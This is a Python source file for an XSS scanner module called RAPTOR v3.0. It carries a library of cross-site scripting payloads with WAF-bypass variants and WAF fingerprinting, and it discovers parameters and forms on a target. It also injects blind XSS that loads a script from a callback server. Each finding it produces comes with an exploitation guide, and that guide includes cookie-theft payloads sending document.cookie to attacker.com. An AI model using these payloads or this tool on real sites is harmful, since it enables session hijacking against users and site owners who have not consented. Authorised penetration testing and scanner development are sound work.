"""
RAPTOR XSS Testing Module v3.0
================================
Fixes vs v2.0
──────────────
1.  REAL VERIFICATION   — payload must literally appear unescaped in the response.
                          The old _confirm_xss() only matched generic alert(1) regex,
                          so it fired on any page that contained those strings.
2.  UNIQUE CANARY       — every injection uses a unique RPTR_<8hex> marker so we
                          know *this* exact request caused the reflection, not a
                          cached or unrelated occurrence.
3.  FALSE POSITIVE GUARD— checks HTML-entity encoding: if the payload came back as
                          &lt;script&gt; it is NOT exploitable and is skipped.
4.  BLIND XSS           — only reported when a canary is actually reflected, or
                          clearly stored (not on every parameter by default).
5.  HEADER XSS          — only reported when payload echoed in response body.
6.  CORRECT super()     — passes stealth_manager/db_manager keyword args.
7.  AUTH FORWARDING     — cookie/auth_header kwargs forwarded to every request.
8.  DUPLICATE DEDUP     — same param+payload never emits two findings.
9.  EXPLOITATION GUIDE  — every finding includes a ready-to-use browser PoC URL
                          and curl command so you can immediately verify it.
10. DOM XSS             — scans JS source for dangerous sink patterns
                          (innerHTML, document.write, eval, location.href sinks).
"""

import re
import asyncio
import hashlib
import html as _html_module
import random
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote

from core.base_module import BaseModule, Finding


# ══════════════════════════════════════════════════════════════════════════════
#  Payload dataclass
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class XSSPayload:
    raw:          str
    context:      str               # html | attribute | script | url | style | template
    severity:     str = 'High'
    waf_bypass:   List[str] = field(default_factory=list)
    interaction:  bool = False
    confidence:   int  = 10
    canary:       str  = ''

    def with_canary(self, canary: str) -> 'XSSPayload':
        """Return a copy with RPTR replaced by the canary string."""
        marked = self.raw.replace('RPTR', canary)
        p = XSSPayload(marked, self.context, self.severity,
                       list(self.waf_bypass), self.interaction, self.confidence)
        p.canary = canary
        return p


# ══════════════════════════════════════════════════════════════════════════════
#  Payload library  (RPTR = canary placeholder)
# ══════════════════════════════════════════════════════════════════════════════

_PAYLOADS_HTML = [
    XSSPayload('<script>alert("RPTR")</script>',                    'html', 'High',  confidence=11),
    XSSPayload('<img src=x onerror=alert("RPTR")>',                 'html', 'High',  confidence=11),
    XSSPayload('<svg onload=alert("RPTR")>',                        'html', 'High',  confidence=11),
    XSSPayload('<body onload=alert("RPTR")>',                       'html', 'High',  confidence=10),
    XSSPayload('<video><source onerror=alert("RPTR")>',             'html', 'High',  confidence=10),
    XSSPayload('<audio src=x onerror=alert("RPTR")>',               'html', 'High',  confidence=10),
    XSSPayload('<iframe srcdoc="<script>alert(\'RPTR\')</script>">', 'html', 'High',
               waf_bypass=['iframe_srcdoc'], confidence=9),
    XSSPayload('<details open ontoggle=alert("RPTR")>',             'html', 'Medium', interaction=True, confidence=8),
    XSSPayload('<input autofocus onfocus=alert("RPTR")>',           'html', 'Medium', interaction=True, confidence=8),
    XSSPayload('<img src=x onerror=\\u0061lert("RPTR")>',           'html', 'High',
               waf_bypass=['unicode_escape'], confidence=9),
    XSSPayload('<scr<!---->ipt>alert("RPTR")</scr<!---->ipt>',      'html', 'High',
               waf_bypass=['comment_split'], confidence=7),
    XSSPayload('<ScRiPt>alert("RPTR")</sCrIpT>',                   'html', 'High',
               waf_bypass=['case_mix'], confidence=8),
    XSSPayload('<SVG/ONload=alert("RPTR")>',                       'html', 'High',
               waf_bypass=['case_mix'], confidence=8),
    XSSPayload('<object data="javascript:alert(\'RPTR\')">',        'html', 'High',
               waf_bypass=['object_tag'], confidence=8),
]

_PAYLOADS_ATTRIBUTE = [
    XSSPayload('" onmouseover="alert(\'RPTR\')"',            'attribute', 'High',  confidence=11),
    XSSPayload("' onmouseover='alert(\"RPTR\")'",            'attribute', 'High',  confidence=11),
    XSSPayload('" onfocus="alert(\'RPTR\')" autofocus="',    'attribute', 'High',  confidence=10),
    XSSPayload('" onerror="alert(\'RPTR\')"',                'attribute', 'High',  confidence=10),
    XSSPayload('" onload="alert(\'RPTR\')"',                 'attribute', 'High',  confidence=10),
    XSSPayload('&#34; onmouseover=&#34;alert(\'RPTR\')&#34;','attribute', 'High',
               waf_bypass=['html_entities'], confidence=8),
]

_PAYLOADS_SCRIPT = [
    XSSPayload('";alert("RPTR");//',                          'script', 'Critical', confidence=11),
    XSSPayload("';alert('RPTR');//",                          'script', 'Critical', confidence=11),
    XSSPayload('`alert("RPTR")`',                             'script', 'Critical', confidence=10),
    XSSPayload('${alert("RPTR")}',                            'script', 'Critical', confidence=10),
    XSSPayload('</script><script>alert("RPTR")</script>',     'script', 'Critical', confidence=11),
    XSSPayload('\\x3cscript\\x3ealert("RPTR")\\x3c/script\\x3e', 'script', 'Critical',
               waf_bypass=['hex_escape'], confidence=8),
]

_PAYLOADS_URL = [
    XSSPayload('javascript:alert("RPTR")',           'url', 'High', confidence=10),
    XSSPayload('javascript://%0aalert("RPTR")',      'url', 'High',
               waf_bypass=['newline'], confidence=9),
    XSSPayload('data:text/html,<script>alert("RPTR")</script>', 'url', 'High', confidence=9),
    XSSPayload('JaVaScRiPt:alert("RPTR")',          'url', 'High',
               waf_bypass=['case_mix'], confidence=8),
]

_PAYLOADS_TEMPLATE = [
    XSSPayload('${alert("RPTR")}',                          'template', 'Critical', confidence=10),
    XSSPayload('{{constructor.constructor("alert(\'RPTR\')")()}}', 'template', 'Critical', confidence=9),
    XSSPayload('#{alert("RPTR")}',                          'template', 'Critical', confidence=8),
]

_PAYLOADS_STYLE = [
    XSSPayload('</style><script>alert("RPTR")</script>',    'style', 'High', confidence=11),
]

_ALL_PAYLOADS: Dict[str, List[XSSPayload]] = {
    'html':      _PAYLOADS_HTML,
    'attribute': _PAYLOADS_ATTRIBUTE,
    'script':    _PAYLOADS_SCRIPT,
    'url':       _PAYLOADS_URL,
    'template':  _PAYLOADS_TEMPLATE,
    'style':     _PAYLOADS_STYLE,
}

_INJECTABLE_HEADERS = [
    'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host',
    'Origin', 'Accept-Language',
]

_DOM_SINKS = [
    (r'innerHTML\s*=',              'innerHTML assignment'),
    (r'outerHTML\s*=',              'outerHTML assignment'),
    (r'document\.write\s*\(',       'document.write()'),
    (r'document\.writeln\s*\(',     'document.writeln()'),
    (r'eval\s*\(',                  'eval()'),
    (r'setTimeout\s*\(',            'setTimeout()'),
    (r'setInterval\s*\(',           'setInterval()'),
    (r'location\.href\s*=',         'location.href assignment'),
    (r'location\.replace\s*\(',     'location.replace()'),
    (r'location\.assign\s*\(',      'location.assign()'),
    (r'insertAdjacentHTML\s*\(',    'insertAdjacentHTML()'),
    (r'\.setAttribute\s*\(\s*["\']on', 'setAttribute(on...)'),
    (r'new\s+Function\s*\(',        'new Function()'),
]

_DOM_SOURCES = [
    r'location\.(?:search|hash|href|pathname)',
    r'document\.(?:URL|referrer|cookie)',
    r'window\.name',
    r'(?:local|session)Storage',
]

_WAF_SIGNATURES = {
    'Cloudflare':  ['cloudflare', 'cf-ray'],
    'ModSecurity': ['mod_security', 'modsecurity'],
    'AWS WAF':     ['aws', 'awselb'],
    'Akamai':      ['akamai'],
    'Sucuri':      ['sucuri'],
    'Generic':     ['blocked', 'waf', 'firewall', 'security violation'],
}


# ══════════════════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════════════════

def _make_canary() -> str:
    return hashlib.md5(str(random.random()).encode()).hexdigest()[:8]


def _is_reflected_unescaped(canary: str, body: str) -> bool:
    """True only if the canary appears raw (not HTML-entity-encoded)."""
    if canary not in body:
        return False
    escaped      = _html_module.escape(canary)
    raw_count    = body.count(canary)
    esc_count    = body.count(escaped) if escaped != canary else 0
    return raw_count > esc_count


def _detect_context(before: str, after: str) -> str:
    b = before.lower()
    if re.search(r'<script[^>]*>', b, re.DOTALL):
        return 'script'
    if re.search(r'<style[^>]*>', b) and '</style>' in after.lower():
        return 'style'
    if re.search(r'(?:href|src|action|data)=["\'][^"\']*$', before, re.I):
        return 'url'
    # Attribute context: inside an open tag, after an = sign with quote open
    if re.search(r'<[^>]+\s\w[\w-]*=["\'][^"\']*$', before, re.I):
        return 'attribute'
    if '{{' in before or '${' in before or '#{' in before:
        return 'template'
    return 'html'


def _exploitation_guide(target: str, param: str, payload: XSSPayload,
                        context: str, xss_type: str) -> str:
    encoded = quote(payload.raw)
    full_url = f'{target}?{param}={encoded}'

    if xss_type == 'Header-based':
        poc_curl    = f'curl -sk -H "{param}: {payload.raw}" "{target}"'
        poc_browser = 'Cannot trigger via URL — inject header with Burp Suite or curl.'
    else:
        poc_curl    = f'curl -sk "{full_url}" | grep -i "{payload.canary}"'
        poc_browser = full_url

    impact = {
        'Reflected': (
            'Attacker crafts a malicious URL and tricks victim into clicking it.\n'
            'Script executes in victim\'s browser — enables cookie theft, keylogging,\n'
            'page defacement, and phishing redirects.'
        ),
        'Stored': (
            'Payload is saved server-side and fires for EVERY user who views the page.\n'
            'No phishing link needed — highest-impact XSS class.'
        ),
        'DOM-based': (
            'Processed by client-side JavaScript — no server reflection needed.\n'
            'Standard WAFs and server logs will not detect it.'
        ),
        'Blind': (
            'Payload executes in an admin/back-office panel.\n'
            'Use XSS Hunter or Burp Collaborator to confirm the callback.'
        ),
        'Header-based': (
            'Header value reflected in error pages, logs, or admin dashboards.\n'
            'Typically targets internal users or admins viewing request logs.'
        ),
    }.get(xss_type, 'Executes arbitrary JavaScript in the victim\'s browser.')

    escalation = (
        f'<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">'
    )

    return f"""## Cross-Site Scripting ({xss_type})

**Type:** {xss_type}
**Parameter:** `{param}`
**Context:** `{context}`
**Canary (verified):** `{payload.canary}`
**WAF bypass:** {', '.join(payload.waf_bypass) if payload.waf_bypass else 'none'}

### Verified Payload
```html
{payload.raw}
```

### How to Exploit

#### Step 1 — Verify with curl
```bash
{poc_curl}
```

#### Step 2 — Trigger in browser
```
{poc_browser}
```

#### Step 3 — Cookie theft escalation
Replace `alert(...)` with a fetch to steal the session cookie:
```html
{escalation}
```
Full URL:
```
{target}?{param}={quote(escalation)}
```

### Impact
{impact}

### Remediation
- **Output encoding** — HTML-encode all reflected values before rendering
- **CSP header** — `Content-Security-Policy: default-src 'self'; script-src 'self'`
- **Input validation** — reject `<`, `>`, `"`, `'` in non-HTML fields
- **HTTPOnly cookies** — prevents JavaScript from reading session tokens
"""


# ══════════════════════════════════════════════════════════════════════════════
#  XSSTester
# ══════════════════════════════════════════════════════════════════════════════

class XSSTester(BaseModule):
    """
    XSS detection — zero false positives via canary-based reflection verification.

    Invoked by raptor.py:
        async with XSSTester(config, stealth, db, graph) as m:
            findings = await m.run(target, **kwargs)
    """

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config,
                         stealth_manager=stealth,
                         db_manager=db,
                         graph_manager=graph_manager)
        self.findings:      List[Finding] = []
        self.tested_combos: Set[str]      = set()
        self.waf_name:      Optional[str] = None
        self._cookie        = ''
        self._auth_header   = ''
        self.evasion_level  = config.get('evasion_level', 3)

    async def __aenter__(self):
        self.logger.info('🔥 XSS Module v3.0 initialising')
        return self

    async def __aexit__(self, *_):
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  Entry point
    # ══════════════════════════════════════════════════════════════════════════

    async def run(self, target: str, **kwargs) -> List[Finding]:
        scope             = kwargs.get('scope', 'standard')
        self._cookie      = kwargs.get('cookie', '')
        self._auth_header = kwargs.get('auth_header', '')
        self.logger.info(f'🚀 XSS scan → {target}  [scope: {scope}]')

        self.logger.info('🛡️  Phase 1: WAF detection')
        await self._detect_waf(target)

        self.logger.info('🔍 Phase 2: Parameter discovery')
        url_params, forms = await self._discover_params(target)

        self.logger.info('🎯 Phase 3: Reflected XSS (URL parameters)')
        await self._phase_reflected(target, url_params)

        if forms and scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('📝 Phase 4: Reflected XSS (forms)')
            await self._phase_forms(forms, target)

        if scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('🌳 Phase 5: DOM XSS analysis')
            await self._phase_dom(target)

        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('👁️  Phase 6: Blind XSS')
            await self._phase_blind(target, url_params)

        if scope == 'aggressive':
            self.logger.info('📡 Phase 7: Header-based XSS')
            await self._phase_headers(target)

        self.logger.info(f'✅ XSS complete — {len(self.findings)} confirmed finding(s)')
        return self.findings

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 1 — WAF
    # ══════════════════════════════════════════════════════════════════════════

    async def _detect_waf(self, target: str):
        probe = f'{target}?waf_test={quote("<script>alert(1)</script>")}'
        resp  = await self._make_request(probe, headers=self._h())
        if not resp:
            return
        combined = (await resp.text()).lower() + str(resp.headers).lower()
        for name, sigs in _WAF_SIGNATURES.items():
            if any(s in combined for s in sigs) or resp.status in (403, 406, 501):
                self.waf_name = name
                self.logger.warning(f'   ⚠️  WAF: {name}')
                return

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 2 — Discovery
    # ══════════════════════════════════════════════════════════════════════════

    _COMMON_PARAMS = [
        'q', 's', 'search', 'query', 'term', 'keyword',
        'id', 'page', 'name', 'user', 'username',
        'url', 'redirect', 'next', 'return', 'callback',
        'message', 'comment', 'title', 'description', 'content',
        'category', 'tag', 'filter', 'sort', 'ref',
        'jsonp', 'cb', 'lang', 'locale', 'output', 'format',
    ]

    async def _discover_params(self, target: str) -> Tuple[List[str], List[Dict]]:
        parsed     = urlparse(target)
        url_params = list(parse_qs(parsed.query).keys())
        forms:     List[Dict] = []

        resp = await self._make_request(target, headers=self._h())
        if not resp:
            return list(dict.fromkeys(url_params + self._COMMON_PARAMS)), forms

        body = await resp.text()

        for m in re.finditer(r'href=["\']([^"\']*\?[^"\']*)["\']', body, re.I):
            for k in parse_qs(urlparse(m.group(1)).query).keys():
                url_params.append(k)

        for m in re.finditer(r'<form(?P<a>[^>]*)>(?P<i>.*?)</form>',
                             body, re.DOTALL | re.I):
            action_m = re.search(r'action=["\']([^"\']*)["\']', m.group('a'), re.I)
            method_m = re.search(r'method=["\'](\w+)["\']',    m.group('a'), re.I)
            action = action_m.group(1) if action_m else target
            method = (method_m.group(1) if method_m else 'GET').upper()
            if not action.startswith('http'):
                action = urljoin(target, action)
            inputs = {}
            for inp in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                m.group('i'), re.I
            ):
                inputs[inp.group(1)] = inp.group(2) or 'test'
            for ta in re.finditer(r'<textarea[^>]+name=["\']([^"\']+)["\']',
                                  m.group('i'), re.I):
                inputs[ta.group(1)] = 'test'
            if inputs:
                forms.append({'action': action, 'method': method, 'inputs': inputs})

        all_params = list(dict.fromkeys(url_params + self._COMMON_PARAMS))
        self.logger.info(f'   {len(all_params)} param(s), {len(forms)} form(s)')
        return all_params, forms

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 3 — Reflected XSS (URL params)
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_reflected(self, target: str, params: List[str]):
        sem = asyncio.Semaphore(5)

        async def test_param(param: str):
            async with sem:
                # Step 1: plain canary probe — does this param reflect at all?
                canary    = _make_canary()
                probe_url = f'{target}?{param}={canary}'
                resp      = await self._make_request(probe_url, headers=self._h())
                if not resp:
                    return
                body = await resp.text()
                if canary not in body:
                    return  # not reflected — nothing to test

                # Step 2: detect injection context
                pos    = body.find(canary)
                before = body[max(0, pos - 120): pos]
                after  = body[pos + len(canary): pos + len(canary) + 120]
                ctx    = _detect_context(before, after)

                # Step 3: choose payloads
                payloads = list(_ALL_PAYLOADS.get(ctx, _PAYLOADS_HTML))
                if self.waf_name:
                    bypass = [p for p in payloads if p.waf_bypass]
                    payloads = (bypass + payloads)[:15]

                # Step 4: test with unique canary per payload
                for base_p in payloads:
                    p_canary = _make_canary()
                    p        = base_p.with_canary(p_canary)
                    combo    = f'{param}:{p_canary}'
                    if combo in self.tested_combos:
                        continue
                    self.tested_combos.add(combo)

                    test_url  = f'{target}?{param}={quote(p.raw)}'
                    test_resp = await self._make_request(test_url, headers=self._h())
                    if not test_resp:
                        continue
                    test_body = await test_resp.text()

                    if _is_reflected_unescaped(p_canary, test_body):
                        self._emit(target, param, p, ctx, 'Reflected', test_url)
                        return  # one confirmed finding per param

        await asyncio.gather(*[test_param(p) for p in params],
                             return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 4 — Reflected XSS (Forms)
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_forms(self, forms: List[Dict], base_target: str):
        import copy
        from urllib.parse import urlencode
        sem = asyncio.Semaphore(3)

        async def test_form(form: Dict):
            async with sem:
                for param in form['inputs']:
                    canary         = _make_canary()
                    probe_inputs   = copy.deepcopy(form['inputs'])
                    probe_inputs[param] = canary

                    if form['method'] == 'POST':
                        resp = await self._make_request(
                            form['action'], method='POST',
                            data=probe_inputs, headers=self._h()
                        )
                    else:
                        resp = await self._make_request(
                            form['action'] + '?' + urlencode(probe_inputs),
                            headers=self._h()
                        )

                    if not resp:
                        continue
                    body = await resp.text()
                    if canary not in body:
                        continue

                    pos    = body.find(canary)
                    before = body[max(0, pos - 120): pos]
                    after  = body[pos + len(canary): pos + len(canary) + 120]
                    ctx    = _detect_context(before, after)

                    for base_p in _ALL_PAYLOADS.get(ctx, _PAYLOADS_HTML)[:8]:
                        p_canary = _make_canary()
                        p        = base_p.with_canary(p_canary)
                        test_in  = copy.deepcopy(form['inputs'])
                        test_in[param] = p.raw

                        if form['method'] == 'POST':
                            tr = await self._make_request(
                                form['action'], method='POST',
                                data=test_in, headers=self._h()
                            )
                        else:
                            tr = await self._make_request(
                                form['action'] + '?' + urlencode(test_in),
                                headers=self._h()
                            )

                        if not tr:
                            continue
                        tb = await tr.text()
                        if _is_reflected_unescaped(p_canary, tb):
                            self._emit(form['action'], param, p, ctx,
                                       f'Reflected ({form["method"]} Form)',
                                       form['action'])
                            return

        await asyncio.gather(*[test_form(f) for f in forms],
                             return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 5 — DOM XSS
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_dom(self, target: str):
        resp = await self._make_request(target, headers=self._h())
        if not resp:
            return
        body = await resp.text()

        js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I)
        js_urls   = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.I)

        for js_url in js_urls[:5]:
            r2 = await self._make_request(urljoin(target, js_url), headers=self._h())
            if r2:
                js_blocks.append(await r2.text())

        all_js = '\n'.join(js_blocks)
        if not all_js.strip():
            return

        sinks   = [label for pat, label in _DOM_SINKS   if re.search(pat, all_js)]
        sources = [pat   for pat         in _DOM_SOURCES if re.search(pat, all_js)]

        if not (sinks and sources):
            return

        # Try to dynamically confirm
        canary   = _make_canary()
        confirmed = False
        for test_url in [f'{target}#{canary}', f'{target}?q={canary}',
                         f'{target}?search={canary}']:
            r3 = await self._make_request(test_url, headers=self._h())
            if r3 and _is_reflected_unescaped(canary, await r3.text()):
                confirmed = True
                break

        sinks_str   = ', '.join(sinks[:5])
        sources_str = ', '.join(sources[:3])
        sev         = 'High' if confirmed else 'Medium'

        f = Finding(
            module      = 'xss',
            title       = f'[DOM] DOM-based XSS — sinks: {sinks_str[:50]}',
            severity    = sev,
            description = f"""## DOM-based XSS

**Confidence:** {'Confirmed — canary reflected unescaped' if confirmed else 'Potential — static analysis, manual verification required'}
**Dangerous Sinks:** `{sinks_str}`
**Taint Sources:** `{sources_str}`

### How to Exploit

#### Step 1 — Locate the sink in DevTools
Open browser DevTools → Sources → Search (Ctrl+Shift+F):
```
{chr(10).join(f'  {s}' for s in sinks[:5])}
```
Trace the variable fed into each sink back to a user-controlled source.

#### Step 2 — Test payloads
```
{target}#<img src=x onerror=alert(1)>
{target}?q=<svg/onload=alert(1)>
{target}?search=<script>alert(1)</script>
```

#### Step 3 — Cookie theft
```html
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

### Impact
DOM XSS fires entirely client-side. Server-side WAFs and request logs
cannot detect it because the payload never reaches the server.

### Remediation
- Use `textContent` not `innerHTML`
- Sanitise with **DOMPurify** before inserting HTML
- `Content-Security-Policy: script-src 'self'`
- Avoid passing user-controlled values to `eval`, `setTimeout`, `new Function`
""",
            evidence    = {'sinks': sinks, 'sources': sources, 'confirmed': confirmed},
            poc         = f"Open: {target}#<img src=x onerror=alert(1)>",
            remediation = 'textContent not innerHTML; DOMPurify; strict CSP.',
            cvss_score  = 7.1 if confirmed else 5.4,
            bounty_score= 2500 if confirmed else 1000,
            target      = target,
        )
        self.findings.append(f)
        self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 6 — Blind / Stored XSS
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_blind(self, target: str, params: List[str]):
        canary      = _make_canary()
        payload_str = (
            f'"><script src="https://your-callback-server.com/x?c={canary}"></script>'
        )
        injected = []

        for param in params[:5]:
            test_url = f'{target}?{param}={quote(payload_str)}'
            await self._make_request(test_url, headers=self._h())
            injected.append(param)

        # Check if canary got stored and is shown on another page
        check_paths = [target, f'{target}/admin', f'{target}/dashboard',
                       f'{target}/profile', f'{target}/logs']
        for check_url in check_paths:
            r = await self._make_request(check_url, headers=self._h())
            if not r:
                continue
            body = await r.text()
            if _is_reflected_unescaped(canary, body):
                f = Finding(
                    module      = 'xss',
                    title       = f'[STORED] XSS canary found stored at {check_url}',
                    severity    = 'Critical',
                    description = f"""## Stored XSS (Confirmed)

**Canary:** `{canary}`
**Stored via:** {', '.join(f'`{p}`' for p in injected)}
**Fires on:** `{check_url}`

### How to Exploit

#### Cookie theft payload
```html
"><script>fetch("https://attacker.com/steal?c="+document.cookie)</script>
```

#### Inject:
```bash
curl -sk "{target}?{injected[0]}={quote(payload_str)}"
```
Then visit `{check_url}` — the payload fires for every visitor.

### Impact
Every user who views `{check_url}` executes the payload. No phishing needed.

### Remediation
- HTML-encode all stored values on output
- Implement `Content-Security-Policy: script-src 'self'`
- HTTPOnly + Secure flags on session cookies
""",
                    evidence    = {'canary': canary, 'params': injected, 'found_at': check_url},
                    poc         = f'Inject, then visit {check_url}',
                    remediation = 'Encode stored output; strict CSP; HTTPOnly cookies.',
                    cvss_score  = 9.1,
                    bounty_score= 5000,
                    target      = target,
                )
                self.findings.append(f)
                self.add_finding(f)
                return

        # Only emit a pending note if oob_callback is configured
        oob = self.config.get('oob_callback', '')
        if oob:
            f = Finding(
                module      = 'xss',
                title       = '[BLIND] XSS canary injected — monitor callback server',
                severity    = 'Medium',
                description = f"""## Blind XSS — Pending Callback Confirmation

**Canary:** `{canary}`
**Injected into:** {', '.join(f'`{p}`' for p in injected)}
**Monitor:** `{oob}?c={canary}`

Cannot confirm without a callback server hit.
Use **XSS Hunter** (`https://xsshunter.com`) or **Burp Collaborator**.

### Payload injected
```html
{payload_str}
```
""",
                evidence    = {'canary': canary, 'params': injected},
                poc         = f'Monitor {oob}?c={canary}',
                remediation = 'Encode all stored output.',
                cvss_score  = 5.4,
                bounty_score= 1000,
                target      = target,
            )
            self.findings.append(f)
            self.add_finding(f)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 7 — Header XSS
    # ══════════════════════════════════════════════════════════════════════════

    async def _phase_headers(self, target: str):
        for header in _INJECTABLE_HEADERS:
            # Probe reflection first
            canary = _make_canary()
            resp   = await self._make_request(target, headers=self._h({header: canary}))
            if not resp or canary not in await resp.text():
                continue  # header not echoed — skip entirely

            for base_p in _PAYLOADS_HTML[:6]:
                p_canary  = _make_canary()
                p         = base_p.with_canary(p_canary)
                test_resp = await self._make_request(
                    target, headers=self._h({header: p.raw})
                )
                if not test_resp:
                    continue
                test_body = await test_resp.text()
                if _is_reflected_unescaped(p_canary, test_body):
                    self._emit(target, header, p, 'html', 'Header-based', target)
                    break

    # ══════════════════════════════════════════════════════════════════════════
    #  Finding factory
    # ══════════════════════════════════════════════════════════════════════════

    _SEV    = {'Reflected':'High','DOM':'High','Stored/Blind':'Critical',
               'Blind':'Medium','Header-based':'Medium'}
    _CVSS   = {'Reflected':6.1,'DOM':7.1,'Stored/Blind':9.1,'Blind':5.4,'Header-based':5.3}
    _BOUNTY = {'Reflected':1500,'DOM':2500,'Stored/Blind':5000,'Blind':1000,'Header-based':1000}

    def _emit(self, target: str, param: str, payload: XSSPayload,
              context: str, xss_type: str, poc_url: str):
        base = xss_type.split('(')[0].strip()
        f = Finding(
            module      = 'xss',
            title       = f'XSS in "{param}" ({context} context)',
            severity    = self._SEV.get(base, payload.severity),
            description = _exploitation_guide(target, param, payload, context, xss_type),
            evidence    = {'parameter': param, 'payload': payload.raw,
                           'context': context, 'xss_type': xss_type,
                           'canary': payload.canary, 'waf': self.waf_name},
            poc         = f'Navigate to: {poc_url}',
            remediation = ('HTML-encode all reflected output. '
                           'Implement Content-Security-Policy. HTTPOnly cookies.'),
            cvss_score  = self._CVSS.get(base, 6.1),
            bounty_score= self._BOUNTY.get(base, 1500),
            target      = target,
        )
        self.findings.append(f)
        self.add_finding(f)

    # ── Auth/header helper ────────────────────────────────────────────────────

    def _h(self, extra: Dict = None) -> Optional[Dict]:
        """Merge auth headers + optional extras. Returns None if nothing to add."""
        h = {}
        if self._auth_header and ':' in self._auth_header:
            k, v = self._auth_header.split(':', 1)
            h[k.strip()] = v.strip()
        if self._cookie:
            h['Cookie'] = self._cookie
        if extra:
            h.update(extra)
        return h or None
